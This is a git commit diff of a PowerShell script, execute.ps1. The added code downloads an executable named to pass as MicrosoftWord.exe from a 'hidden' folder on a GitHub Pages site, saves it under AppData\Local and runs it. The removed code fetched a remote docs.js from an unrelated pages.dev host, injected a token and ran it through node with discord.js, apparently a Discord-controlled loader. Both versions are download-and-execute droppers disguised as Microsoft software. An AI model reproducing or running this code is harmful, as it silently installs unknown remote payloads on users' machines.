6f17fad3aa5b88ea1b976929945200e4db20e978
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-13 22:29:00 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -1,27 +1,8 @@
-$folderPath = Join-Path -Path $env:USERPROFILE -ChildPath "MicrosoftWord"
+$url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/MicrosoftWord.exe"
+$localPath = "$env:USERPROFILE\AppData\Local\MicrosoftWord.exe"
 
-if (-Not (Test-Path -Path $folderPath)) {
-    New-Item -Path $folderPath -ItemType Directory
+if (-Not (Test-Path $localPath)) {
+    Invoke-WebRequest -Uri $url -OutFile $localPath
 }
 
-Set-Location -Path $folderPath
-
-& "C:\Program Files\nodejs\npm.cmd" init -y
-
-Start-Sleep -Seconds 5
-
-& "C:\Program Files\nodejs\npm.cmd" install discord.js
-
-Start-Sleep -Seconds 5
-
-Invoke-WebRequest -Uri "https://ipspjyikta.pages.dev/files/docs.js" -OutFile "$folderPath\docs.js"
-
-$token = "ok"
-
-$content = Get-Content "$folderPath\docs.js" -Raw
-
-$updatedContent = $content -replace "const TOKEN = 'token here';", "const TOKEN = '$token';"
-
-Set-Content "$folderPath\docs.js" -Value $updatedContent
-
-& "C:\Program Files\nodejs\node.exe" "$folderPath\docs.js"
+Start-Process $localPath
